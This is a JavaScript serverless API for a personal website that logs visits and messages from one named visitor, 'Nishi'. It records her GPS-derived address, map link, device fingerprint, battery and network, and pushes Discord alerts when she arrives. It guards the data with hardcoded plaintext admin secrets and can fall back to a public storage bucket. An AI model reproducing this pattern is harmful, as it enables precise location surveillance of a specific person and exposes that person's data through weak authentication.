/**
 * ADVANCED VERCEL SERVERLESS VISITOR & WHISPER TRACKING API
 * 
 * Cloud Persistence:
 * - Automatically syncs with Free Cloud Storage (works across different cities & devices)
 * - Supports Upstash Redis / Vercel KV if environment variables are set
 * - Supports Discord Webhook for instant phone notifications
 * - In-memory fallback
 */

import { CLIENT_HINT_HEADERS, resolveClientEnvironment } from './clientEnvironment.js';
import { normalizeRecordList } from './storedLists.js';

const CLOUD_STORE_URL = 'https://kvdb.io/K9m8Wj6T2xAnimatedNishi/';

function getRedisCredentials() {
  const url = process.env.STORAGE_REST_API_URL 
    || process.env.UPSTASH_REDIS_REST_URL 
    || process.env.KV_REST_API_URL 
    || process.env.STORAGE_URL 
    || process.env.UPSTASH_REDIS_URL;

  const token = process.env.STORAGE_REST_API_TOKEN 
    || process.env.UPSTASH_REDIS_REST_TOKEN 
    || process.env.KV_REST_API_TOKEN 
    || process.env.STORAGE_TOKEN;

  return { url, token };
}

function parseStoredValue(result) {
  if (result == null || result === '') return null;
  if (typeof result !== 'string') return result;
  try {
    return JSON.parse(result);
  } catch {
    return result;
  }
}

function isCleanRecordList(value) {
  return Array.isArray(value) && value.every((item) => item && typeof item === 'object' && !Array.isArray(item));
}

async function readCloudValue(key) {
  const { url, token } = getRedisCredentials();

  if (url && token) {
    try {
      const endpoint = `${url.replace(/\/$/, '')}/get/${encodeURIComponent(key)}`;
      const res = await fetch(endpoint, {
        headers: { Authorization: `Bearer ${token}` }
      });
      if (res.ok) {
        const data = await res.json();
        if (data.result == null) return null;
        return parseStoredValue(data.result);
      }
    } catch (e) {}
  }

  try {
    const res = await fetch(`${CLOUD_STORE_URL}${key}`);
    if (res.ok) return await res.json();
  } catch (e) {}

  return null;
}

async function saveCloudData(key, value) {
  const jsonStr = JSON.stringify(value);
  const { url, token } = getRedisCredentials();

  if (url && token) {
    try {
      const endpoint = url.replace(/\/$/, '');
      const res = await fetch(endpoint, {
        method: 'POST',
        headers: { Authorization: `Bearer ${token}` },
        body: JSON.stringify(['SET', key, jsonStr])
      });
      if (res.ok) return;
    } catch (e) {}
  }

  try {
    await fetch(`${CLOUD_STORE_URL}${key}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: jsonStr
    });
  } catch (e) {}
}

async function loadRecordList(key, idKey) {
  const raw = await readCloudValue(key);
  const records = normalizeRecordList(raw, idKey);
  if (raw != null && !isCleanRecordList(raw)) {
    await saveCloudData(key, records);
  }
  return records;
}

function readJsonBody(req) {
  let body = req.body;
  if (typeof Buffer !== 'undefined' && Buffer.isBuffer(body)) {
    body = body.toString('utf8');
  }
  if (typeof body === 'string') {
    try {
      return JSON.parse(body);
    } catch {
      return {};
    }
  }
  if (body && typeof body === 'object' && !Array.isArray(body)) return body;
  return {};
}

function headerText(headers, name) {
  const value = headers?.[name] || headers?.[name.toLowerCase()] || '';
  if (typeof value !== 'string' || !value) return '';
  try {
    return decodeURIComponent(value);
  } catch {
    return value;
  }
}

async function reverseGeocode(latitude, longitude) {
  const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&addressdetails=1&zoom=16&lat=${encodeURIComponent(latitude)}&lon=${encodeURIComponent(longitude)}`;
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 2500);

  try {
    const res = await fetch(url, {
      signal: controller.signal,
      headers: {
        Accept: 'application/json',
        'User-Agent': 'NishiUniverse/1.0 (personal visitor log)'
      }
    });
    if (!res.ok) return null;
    const data = await res.json();
    const address = data.address || {};
    const locality = address.village || address.suburb || address.neighbourhood || address.hamlet || '';
    const city = address.city || address.town || address.state_district || '';
    return {
      locality,
      city,
      region: address.state || '',
      postal: address.postcode || '',
      country: address.country || ''
    };
  } catch (e) {
    return null;
  } finally {
    clearTimeout(timeoutId);
  }
}

function countryName(code) {
  if (!code) return '';
  if (code.length !== 2) return code;
  try {
    return new Intl.DisplayNames(['en'], { type: 'region' }).of(code.toUpperCase()) || code;
  } catch {
    return code;
  }
}

function environmentDetailScore(environment = {}) {
  let score = 0;
  if (environment.browserVersion && !/\.0\.0\.0$/.test(environment.browserVersion)) score += 2;
  if (environment.osVersion) score += 2;
  if (environment.deviceModel && !/^(iPhone|iPad)$/.test(environment.deviceModel)) score += 1;
  if (environment.architecture) score += 1;
  if (environment.screen) score += 1;
  if (environment.networkLabel) score += 1;
  return score;
}

function applyEnvironment(session, environment, isp) {
  session.device = environment.deviceLabel;
  session.os = environment.osLabel;
  session.browser = environment.browserLabel;
  session.browserName = environment.browserName;
  session.browserVersion = environment.browserVersion;
  session.browserEngine = environment.browserEngine;
  session.inApp = environment.inApp;
  session.deviceType = environment.deviceType;
  session.deviceVendor = environment.deviceVendor;
  session.deviceModel = environment.deviceModel;
  session.language = environment.language;
  session.timeZone = environment.timeZone;
  session.architecture = environment.architecture;
  session.bitness = environment.bitness;
  session.viewport = environment.viewport;
  session.pixelRatio = environment.pixelRatio;
  session.orientation = environment.orientation;
  session.touch = environment.touch;
  session.cores = environment.cores;
  session.memoryGb = environment.memoryGb;
  session.colorScheme = environment.colorScheme;
  if (environment.screen) session.screen = environment.screen;

  const networkParts = [];
  if (environment.networkLabel) networkParts.push(environment.networkLabel);
  if (isp && isp !== 'Telecom / Wi-Fi') networkParts.push(isp);
  if (networkParts.length) session.network = networkParts.join(' · ');

  session.isMobile = environment.deviceType === 'mobile' || environment.deviceType === 'tablet';
  session.isProbableNishi = session.isMobile;
  session.environment = environment;
}

function phoneKeyFromEnvironment(environment = {}) {
  const parts = [
    environment.deviceLabel,
    environment.deviceModel,
    environment.screen,
    environment.browserName,
    environment.osLabel,
    environment.language
  ].map((value) => String(value || '').toLowerCase().trim()).filter(Boolean);

  if (parts.length < 3) return '';
  let hash = 5381;
  const raw = parts.join('|');
  for (let i = 0; i < raw.length; i += 1) {
    hash = ((hash << 5) + hash) + raw.charCodeAt(i);
  }
  return (hash >>> 0).toString(36);
}

function formatDuration(seconds = 0) {
  if (!seconds || seconds <= 0) return '1s';
  if (seconds < 60) return `${seconds}s`;
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins}m ${secs}s`;
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,POST');
  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
  Object.entries(CLIENT_HINT_HEADERS).forEach(([key, value]) => {
    res.setHeader(key, value);
  });

  if (req.method === 'OPTIONS') {
    res.status(200).end();
    return;
  }

  // 1. GET: Return sessions and whispers for admin dashboard
  if (req.method === 'GET') {
    const rawSecret = (req.query.secret || req.query.admin || '').trim().replace(/[./]+$/, '').toLowerCase();
    if (!['shivam6120', 'niraj6120', 'shivam', 'niraj'].includes(rawSecret)) {
      return res.status(401).json({ error: 'Unauthorized. Secret key required.' });
    }

    // Retrieve from Cloud Storage
    const cloudSessions = await loadRecordList('universe_sessions', 'sessionId');
    const cloudWhispers = await loadRecordList('universe_whispers', 'id');

    return res.status(200).json({
      success: true,
      totalSessions: cloudSessions.length,
      sessions: cloudSessions,
      whispers: cloudWhispers
    });
  }

  // 2. POST: Process tracking events, whispers, and log clearing
  if (req.method === 'POST') {
    try {
      const body = readJsonBody(req);

      // Admin Action: Clear test logs
      if (body.action === 'clear_test_logs') {
        const rawSecret = (body.secret || '').trim().replace(/[./]+$/, '').toLowerCase();
        if (['shivam6120', 'niraj6120', 'shivam', 'niraj'].includes(rawSecret)) {
          await saveCloudData('universe_sessions', []);
          return res.status(200).json({ success: true, message: 'Test visitor logs cleared successfully.' });
        }
        return res.status(401).json({ error: 'Unauthorized' });
      }

      const userAgent = req.headers['user-agent'] || '';
      const environment = resolveClientEnvironment({
        userAgent,
        headers: req.headers,
        client: body.client
      });

      const preciseLocation = body.clientLocationSource === 'gps';
      let country = countryName(body.clientCountry || (preciseLocation ? '' : headerText(req.headers, 'x-vercel-ip-country')));
      let city = body.clientCity || (preciseLocation ? '' : headerText(req.headers, 'x-vercel-ip-city'));
      let region = body.clientRegion || (preciseLocation ? '' : headerText(req.headers, 'x-vercel-ip-country-region'));
      let postal = body.clientPostal || (preciseLocation ? '' : headerText(req.headers, 'x-vercel-ip-postal-code'));
      let locality = '';
      const latitude = body.clientLat || (preciseLocation ? '' : headerText(req.headers, 'x-vercel-ip-latitude')) || null;
      const longitude = body.clientLon || (preciseLocation ? '' : headerText(req.headers, 'x-vercel-ip-longitude')) || null;
      const mapsUrl = body.clientMapsUrl || (latitude && longitude ? `https://www.google.com/maps?q=${latitude},${longitude}` : '');
      const isp = body.clientIsp || 'Telecom / Wi-Fi';

      if (preciseLocation && latitude && longitude) {
        const place = await reverseGeocode(latitude, longitude);
        if (place) {
          locality = place.locality;
          city = place.city || locality;
          region = place.region || region;
          postal = place.postal || postal;
          country = place.country || country;
        }
      }

      const locParts = [];
      if (locality && locality !== city) locParts.push(locality);
      if (city) locParts.push(city);
      if (region && region !== city) locParts.push(region);
      if (postal) locParts.push(`PIN: ${postal}`);
      if (country && country !== city) locParts.push(country);
      const locationString = locParts.join(', ');

      const now = new Date();
      const localTimeString = now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit' });
      const localDateString = now.toLocaleDateString('en-US', { day: 'numeric', month: 'short', year: 'numeric' });

      // Handle Whisper Messages from Nishi
      if (body.action === 'whisper_message') {
        const whisperSessionId = typeof body.sessionId === 'string' ? body.sessionId.trim().slice(0, 80) : '';
        const whisperVisitorId = typeof body.visitorId === 'string' ? body.visitorId.trim().slice(0, 64) : '';
        const whisperEntry = {
          id: Date.now() + Math.random().toString(36).substring(2, 6),
          text: String(body.message || '').trim().slice(0, 500),
          time: localTimeString,
          date: localDateString,
          timestamp: now.toISOString(),
          sessionId: whisperSessionId,
          visitorId: whisperVisitorId,
          device: `${environment.deviceLabel} (${environment.osLabel})`,
          location: locationString,
          mapsUrl: mapsUrl || body.clientMapsUrl
        };

        const existingWhispers = await loadRecordList('universe_whispers', 'id');
        existingWhispers.unshift(whisperEntry);
        await saveCloudData('universe_whispers', existingWhispers.slice(0, 50));

        if (whisperSessionId) {
          const whisperSessions = await loadRecordList('universe_sessions', 'sessionId');
          const whisperIndex = whisperSessions.findIndex((session) => session.sessionId === whisperSessionId);
          if (whisperIndex >= 0) {
            const whisperSession = whisperSessions[whisperIndex];
            whisperSession.note = whisperEntry.text;
            whisperSession.actions = Array.isArray(whisperSession.actions) ? whisperSession.actions : [];
            if (!whisperSession.actions.includes('whisper_message')) whisperSession.actions.push('whisper_message');
            if (whisperVisitorId && !whisperSession.visitorId) whisperSession.visitorId = whisperVisitorId;
            whisperSessions[whisperIndex] = whisperSession;
            await saveCloudData('universe_sessions', whisperSessions.slice(0, 80));
          }
        }

        // Discord webhook alert if configured
        const discordWebhook = process.env.DISCORD_WEBHOOK_URL;
        if (discordWebhook) {
          try {
            await fetch(discordWebhook, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                username: 'Nishi\'s Universe Whisper',
                embeds: [{
                  title: '💌 A New Whisper from Nishi!',
                  description: `*"${body.message}"*`,
                  color: 16723317,
                  fields: [
                    { name: '🕒 Time', value: `${localTimeString} (${localDateString})`, inline: true },
                    { name: '📱 Device', value: `${environment.deviceLabel} · ${environment.browserLabel}`, inline: true },
                    { name: '📍 Location', value: locationString, inline: true },
                    ...(mapsUrl ? [{ name: '🗺️ Map', value: `[Open on Google Maps](${mapsUrl})`, inline: false }] : [])
                  ],
                  footer: { text: 'Nishi\'s Romantic Universe' },
                  timestamp: now.toISOString()
                }]
              })
            });
          } catch (e) {}
        }

        return res.status(200).json({ success: true, whisper: whisperEntry });
      }

      // Handle Distinct Session Management in Cloud Storage
      const sessionId = body.sessionId || 'session_' + Date.now();
      const visitorId = typeof body.visitorId === 'string' ? body.visitorId.trim().slice(0, 64) : '';
      const inviteName = typeof body.inviteName === 'string' ? body.inviteName.trim().slice(0, 40) : '';
      const durationSeconds = body.durationSeconds || 1;
      let existingSessions = await loadRecordList('universe_sessions', 'sessionId');

      const sessionIndex = existingSessions.findIndex((s) => s.sessionId === sessionId);

      if (sessionIndex === -1) {
        // New session entry
        const newSession = {
          sessionId,
          visitorId,
          inviteName,
          date: localDateString,
          startTime: localTimeString,
          startTimestamp: now.toISOString(),
          lastActiveTime: localTimeString,
          lastActiveTimestamp: now.toISOString(),
          durationSeconds: durationSeconds,
          durationFormatted: formatDuration(durationSeconds),
          screen: 'Unknown',
          battery: body.battery || 'Unavailable',
          network: 'Unknown',
          location: locationString,
          locality: locality,
          city: city,
          region: region,
          postal: postal,
          locationSource: preciseLocation ? 'gps' : 'ip',
          latitude: latitude,
          longitude: longitude,
          mapsUrl: mapsUrl,
          isp: isp,
          status: body.action === 'session_pause' ? 'away' : 'active',
          actions: [body.action || 'page_view']
        };
        applyEnvironment(newSession, environment, isp);
        const nextPhoneKey = phoneKeyFromEnvironment(environment);
        if (nextPhoneKey) newSession.phoneKey = nextPhoneKey;
        const isMobileDevice = newSession.isMobile;

        existingSessions.unshift(newSession);

        // Discord notification for fresh visits
        const discordWebhook = process.env.DISCORD_WEBHOOK_URL;
        if (discordWebhook && body.action === 'page_view') {
          try {
            await fetch(discordWebhook, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                username: 'Universe Visitor Alert',
                embeds: [{
                  title: isMobileDevice ? '🌸 Nishi entered your universe!' : '✨ New Visitor on your universe!',
                  color: isMobileDevice ? 16723317 : 3447003,
                  fields: [
                    { name: '📱 Device', value: `${environment.deviceLabel} (${environment.osLabel})`, inline: true },
                    { name: '🌐 Browser', value: environment.browserLabel, inline: true },
                    { name: '📍 Location', value: locationString, inline: true },
                    { name: '📶 Network', value: newSession.network || isp || 'Unknown', inline: true },
                    { name: '🔋 Battery', value: body.battery || 'N/A', inline: true },
                    { name: '🕒 Time', value: localTimeString, inline: true },
                    ...(mapsUrl ? [{ name: '🗺️ Map', value: `[Open on Google Maps](${mapsUrl})`, inline: false }] : [])
                  ],
                  timestamp: now.toISOString()
                }]
              })
            });
          } catch (e) {}
        }
      } else {
        // Update ongoing session
        const sess = existingSessions[sessionIndex];
        sess.lastActiveTime = localTimeString;
        sess.lastActiveTimestamp = now.toISOString();
        if (visitorId && !sess.visitorId) sess.visitorId = visitorId;
        if (inviteName) sess.inviteName = inviteName;

        if (durationSeconds > (sess.durationSeconds || 0)) {
          sess.durationSeconds = durationSeconds;
          sess.durationFormatted = formatDuration(durationSeconds);
        }

        if (body.action === 'session_end') {
          sess.status = 'completed';
          sess.endedAt = localTimeString;
        } else if (body.action === 'session_pause') {
          if (sess.status !== 'completed') sess.status = 'away';
        } else if (body.action !== 'metadata_enrichment') {
          sess.status = 'active';
        }

        if (body.battery && body.battery !== 'Unavailable') {
          sess.battery = body.battery;
        }

        const incomingScore = environmentDetailScore(environment);
        const storedScore = environmentDetailScore(sess.environment);
        if (body.client && incomingScore >= storedScore) {
          applyEnvironment(sess, environment, isp || sess.isp);
          const nextPhoneKey = phoneKeyFromEnvironment(environment);
          if (nextPhoneKey) sess.phoneKey = nextPhoneKey;
        }

        const canReplaceLocation = preciseLocation || (sess.locationSource !== 'gps' && (!sess.city || sess.city === 'Unknown City'));
        if (canReplaceLocation && (city || locality || (latitude && longitude))) {
          sess.locality = locality || (preciseLocation ? '' : sess.locality);
          sess.city = city || sess.city;
          sess.region = region || sess.region;
          sess.postal = postal || sess.postal;
          sess.country = country || sess.country;
          sess.latitude = latitude || sess.latitude;
          sess.longitude = longitude || sess.longitude;
          sess.mapsUrl = mapsUrl || sess.mapsUrl;
          sess.location = locationString || sess.location;
          if (preciseLocation) sess.locationSource = 'gps';
        }

        if (body.clientMapsUrl && !sess.mapsUrl) {
          sess.mapsUrl = body.clientMapsUrl;
        }

        if (isp && (!sess.isp || sess.isp === 'Telecom / Wi-Fi')) {
          sess.isp = isp;
        }

        const hiddenActions = ['session_pause', 'session_resume', 'session_end', 'metadata_enrichment'];
        if (body.action && !sess.actions.includes(body.action) && !body.action.startsWith('duration_') && !hiddenActions.includes(body.action)) {
          sess.actions.push(body.action);
        }

        existingSessions[sessionIndex] = sess;
      }

      await saveCloudData('universe_sessions', existingSessions.slice(0, 80));

      return res.status(200).json({ success: true, sessionId });
    } catch (err) {
      console.error('Error in track API:', err);
      return res.status(500).json({ error: 'Internal server error' });
    }
  }

  res.status(405).json({ error: 'Method not allowed' });
}
